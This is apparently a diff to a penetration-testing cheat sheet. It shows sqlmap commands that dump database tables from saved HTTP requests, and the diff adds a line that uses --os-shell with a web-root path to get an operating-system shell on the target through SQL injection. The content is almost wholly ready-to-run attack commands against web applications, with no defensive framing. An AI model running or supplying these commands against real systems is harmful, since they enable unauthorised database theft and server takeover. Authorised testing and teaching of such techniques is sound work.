@@ -45,6 +45,8 @@ sqlmap -r request.txt --dbms= "mssql" --tables -D <DB_Name> --batch --threads=3
 sqlmap -r login_post_req.txt -p id --dbms= "mssql" --tables -D strigi -T <Table_Name> --dump --batch --threads=3
 
 sqlmap -r request.txt --dbms= "mysql" --tables -D <table name> --dump --batch --threads=3
+
+sqlmap -r request_post.txt -p username --os-shell --web-root "/var/www/html/tmp" --batch --flush-session
 ```
 ##### **Testing for Blind SQL Injection**
 ```
